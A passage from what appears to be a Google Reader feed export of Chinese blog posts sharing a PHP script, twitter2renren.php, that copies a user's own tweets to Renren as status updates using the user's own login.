style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$lastid</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">intval</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">file_get_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">else</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#990000\">touch</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$lastid</span> <span style=\"color:#339933\">=</span> <span style=\"color:#cc66cc\">0</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n \n \n<span style=\"color:#000088\">$timeline_url</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'http://'</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$twitter_username</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">':'</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$twitter_pwd</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">'@twitter.com/statuses/user_timeline.rss?count=200'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$lastid</span><span style=\"color:#339933\">!==</span><span style=\"color:#cc66cc\">0</span><span style=\"color:#009900\">)</span> <span style=\"color:#000088\">$timeline_url</span><span style=\"color:#339933\">.=</span><span style=\"color:#0000ff\">&#39;&amp;since_id=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$lastid</span><span style=\"color:#339933\">;</span>\n \n \n<span style=\"color:#000088\">$timeline</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">file_get_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$timeline_url</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#000088\">$obj</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">simplexml_load_string</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$timeline</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#000088\">$items</span> <span style=\"color:#339933\">=</span> <span style=\"color:#000088\">$obj</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#004000\">channel</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#004000\">item</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">empty</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#b1b100\">echo</span> <span style=\"color:#0000ff\">&quot;no newer tweet<span style=\"color:#000099;font-weight:bold\">\\n</span>&quot;</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">exit</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">sizeof</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">==</span><span style=\"color:#cc66cc\">1</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$new_id</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">preg_replace</span><span style=\"color:#009900\">(</span><span style=\"color:#0000ff\">'/.*\\/([0-9]*)$/'</span><span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'$1'</span><span style=\"color:#339933\">,</span><span style=\"color:#990000\">strval</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#990000\">link</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">else</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$new_id</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">preg_replace</span><span style=\"color:#009900\">(</span><span style=\"color:#0000ff\">'/.*\\/([0-9]*)$/'</span><span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'$1'</span><span style=\"color:#339933\">,</span><span style=\"color:#990000\">strval</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span><span style=\"color:#009900\">[</span><span style=\"color:#cc66cc\">0</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#990000\">link</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$new_id</span> <span style=\"color:#339933\">==</span> <span style=\"color:#0000ff\">''</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#b1b100\">echo</span> <span style=\"color:#0000ff\">&quot;error<span style=\"color:#000099;font-weight:bold\">\\n</span>&quot;</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">exit</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#990000\">file_put_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$new_id</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$post_arr</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">array</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">foreach</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span> <span style=\"color:#b1b100\">as</span> <span style=\"color:#000088\">$tweet</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$text</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">substr</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$tweet</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#004000\">title</span><span style=\"color:#339933\">,</span><span style=\"color:#990000\">strlen</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$twitter_username</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">+</span><span style=\"color:#cc66cc\">2</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">strpos</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$text</span><span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'@'</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">!==</span><span style=\"color:#cc66cc\">0</span> <span style=\"color:#339933\">&amp;&amp;</span> <span style=\"color:#009900\">(</span> <span style=\"color:#990000\">empty</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$hashtag</span><span style=\"color:#009900\">)</span> <span style=\"color:#339933\">||</span> <span style=\"color:#990000\">strpos</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$text</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$hashtag</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">!==</span><span style=\"color:#009900;font-weight:bold\">FALSE</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n        <span style=\"color:#000088\">$text</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">str_replace</span><span style=\"color:#009900\">(</span><span style=\"color:#0000ff\">&quot;RT: @&quot;</span><span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">&quot;转自&quot;</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$text</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n         <span style=\"color:#000088\">$post_arr</span><span style=\"color:#009900\">[</span><span style=\"color:#009900\">]</span> <span style=\"color:#339933\">=</span> <span style=\"color:#000088\">$text</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">' [twitter]'</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#009900\">}</span>\n<span style=\"color:#009900\">}</span>\n \n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">empty</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$post_arr</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#b1b100\">echo</span> <span style=\"color:#0000ff\">&quot;no need.<span style=\"color:#000099;font-weight:bold\">\\n</span>&quot;</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">exit</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n \n<span style=\"color:#666666;font-style:italic\">//$post_arr = array_reverse($post_arr);</span>\n \n<span style=\"color:#000088\">$renren_login</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">&quot;http://passport.renren.com/PLogin.do&quot;</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$ch</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_init</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_COOKIEJAR<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$cookie_file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_URL<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$renren_login</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POST<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_FOLLOWLOCATION<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POSTFIELDS<span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'email='</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$renren_username</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;password=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$renren_password</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;autoLogin=true&amp;origURL=http://www.renren.com/Home.do&amp;domain=renren.com&#39;</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_RETURNTRANSFER<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#666666;font-style:italic\">#curl_setopt($ch,CURLOPT_VERBOSE,TRUE);\n</span><span style=\"color:#000088\">$str</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_exec</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$pattern</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">&quot;/get_check:&#39;([^&#39;]*)&#39;/&quot;</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">preg_match</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$pattern</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$str</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$matches</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$get_check</span> <span style=\"color:#339933\">=</span> <span style=\"color:#000088\">$matches</span><span style=\"color:#009900\">[</span><span style=\"color:#cc66cc\">1</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_close</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$renren_status</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'http://status.renren.com/doing/update.do'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">foreach</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$post_arr</span> <span style=\"color:#b1b100\">as</span> <span style=\"color:#000088\">$item</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$post</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'c='</span><span style=\"color:#339933\">.</span><span style=\"color:#990000\">urlencode</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$item</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;raw=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#990000\">urlencode</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$item</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;isAtHome=0&amp;publisher_form_ticket=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$get_check</span><span style=\"color:#339933\">;</span>\n \n    <span style=\"color:#000088\">$ch</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_init</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$renren_status</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POST<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POSTFIELDS<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$post</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_RETURNTRANSFER<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_COOKIEFILE<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$cookie_file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_FOLLOWLOCATION<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_REFERER<span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'http://status.renren.com/ajaxproxy.htm'</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$ret</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_exec</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_close</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$ret</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">json_decode</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ret</span><span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#b1b100\">echo</span> <span style=\"color:#000088\">$ret</span><span style=\"color:#009900\">[</span><span style=\"color:#0000ff\">'msg'</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&quot;<span style=\"color:#000099;font-weight:bold\">\\n</span>&quot;</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n \n<span style=\"color:#000000;font-weight:bold\">?&gt;</span></pre></td></tr></table></div>\n\n<hr>\n<p><small>© yegle for <a href=\"http://yegle.net\">一阁Blog</a>, 2010. |\n本文短链：<a href=\"http://ye.gl/e/7q\">http://ye.gl/e/7q</a> |\n<a href=\"http://ye.gl/e/7q#comments\">12个评论</a> |\nPost tags: <a href=\"http://yegle.net/tag/renren/\" rel=\"tag\">renren</a>, <a href=\"http://yegle.net/tag/twitter/\" rel=\"tag\">twitter</a><br>\n</small></p>"
    },
    "author" : "yegle",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://yegle.net/feed/",
      "title" : "一阁Blog",
      "htmlUrl" : "http://yegle.net"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298465226770",
    "timestampUsec" : "1298465226770783",
    "id" : "tag:google.com,2005:reader/item/70882824a269b034",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "脚本", "php", "renren", "twitter" ],
    "title" : "Twitter2Renren PHP同步脚本（20100828更新）",
    "published" : 1282976872,
    "updated" : 1282976872,
    "alternate" : [ {
      "href" : "http://yegle.net/2010/08/28/twitter2renren-php/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>又更新了一下，使用m.renren.com进行状态发布</p>\n<p>脚本名称正式定为twitter2renren.php</p>\n<p>使用方法详见<a href=\"http://yegle.net/2009/10/31/php-script-synchronizing-twitter-to-renren/\">这篇日志</a></p>\n<p>代码：</p>\n\n<div><table><tr><td><pre style=\"font-family:monospace\"><span style=\"color:#339933\">&lt;</span> ?php\n \n<span style=\"color:#666666;font-style:italic\">//</span>\n<span style=\"color:#666666;font-style:italic\">//twitter2renren.php</span>\n<span style=\"color:#666666;font-style:italic\">//By @yegle, yegle.net</span>\n<span style=\"color:#666666;font-style:italic\">//Licensed under CC by-nc-sa</span>\n<span style=\"color:#666666;font-style:italic\">//Version:20100828</span>\n<span style=\"color:#666666;font-style:italic\">//</span>\n \n<span style=\"color:#000088\">$file</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'/home/yegle/.twitter2renren'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$cookie_file</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'/home/yegle/.twitter2renren.cookie'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$twitter_username</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">''</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$twitter_pwd</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">''</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$hashtag</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">''</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$renren_username</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">''</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$renren_password</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">''</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#666666;font-style:italic\">//配置完毕，请停止编辑文件！</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">file_exists</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$lastid</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">intval</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">file_get_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">else</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#990000\">touch</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$lastid</span> <span style=\"color:#339933\">=</span> <span style=\"color:#cc66cc\">0</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n \n \n<span style=\"color:#000088\">$timeline_url</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'http://'</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$twitter_username</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">':'</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$twitter_pwd</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">'@twitter.com/statuses/user_timeline.rss?count=200'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$lastid</span><span style=\"color:#339933\">!==</span><span style=\"color:#cc66cc\">0</span><span style=\"color:#009900\">)</span> <span style=\"color:#000088\">$timeline_url</span><span style=\"color:#339933\">.=</span><span style=\"color:#0000ff\">&#39;&amp;since_id=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$lastid</span><span style=\"color:#339933\">;</span>\n \n \n<span style=\"color:#000088\">$timeline</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">file_get_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$timeline_url</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#000088\">$obj</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">simplexml_load_string</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$timeline</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#000088\">$items</span> <span style=\"color:#339933\">=</span> <span style=\"color:#000088\">$obj</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#004000\">channel</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#004000\">item</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">empty</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#b1b100\">echo</span> <span style=\"color:#0000ff\">&quot;no newer tweet<span style=\"color:#000099;font-weight:bold\">\\n</span>&quot;</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">exit</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">sizeof</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">==</span><span style=\"color:#cc66cc\">1</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$new_id</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">preg_replace</span><span style=\"color:#009900\">(</span><span style=\"color:#0000ff\">'/.*\\/([0-9]*)$/'</span><span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'$1'</span><span style=\"color:#339933\">,</span><span style=\"color:#990000\">strval</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#990000\">link</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">else</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$new_id</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">preg_replace</span><span style=\"color:#009900\">(</span><span style=\"color:#0000ff\">'/.*\\/([0-9]*)$/'</span><span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'$1'</span><span style=\"color:#339933\">,</span><span style=\"color:#990000\">strval</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span><span style=\"color:#009900\">[</span><span style=\"color:#cc66cc\">0</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#990000\">link</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$new_id</span> <span style=\"color:#339933\">==</span> <span style=\"color:#0000ff\">''</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#b1b100\">echo</span> <span style=\"color:#0000ff\">&quot;error<span style=\"color:#000099;font-weight:bold\">\\n</span>&quot;</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">exit</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#990000\">file_put_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$new_id</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$post_arr</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">array</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">foreach</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$items</span> <span style=\"color:#b1b100\">as</span> <span style=\"color:#000088\">$tweet</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$text</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">substr</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$tweet</span><span style=\"color:#339933\">-&gt;</span><span style=\"color:#004000\">title</span><span style=\"color:#339933\">,</span><span style=\"color:#990000\">strlen</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$twitter_username</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">+</span><span style=\"color:#cc66cc\">2</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">strpos</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$text</span><span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'@'</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">!==</span><span style=\"color:#cc66cc\">0</span> <span style=\"color:#339933\">&amp;&amp;</span> <span style=\"color:#009900\">(</span> <span style=\"color:#990000\">empty</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$hashtag</span><span style=\"color:#009900\">)</span> <span style=\"color:#339933\">||</span> <span style=\"color:#990000\">strpos</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$text</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$hashtag</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">!==</span><span style=\"color:#009900;font-weight:bold\">FALSE</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n        <span style=\"color:#000088\">$text</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">str_replace</span><span style=\"color:#009900\">(</span><span style=\"color:#0000ff\">&quot;RT: @&quot;</span><span style=\"color:#339933\">,</span><span 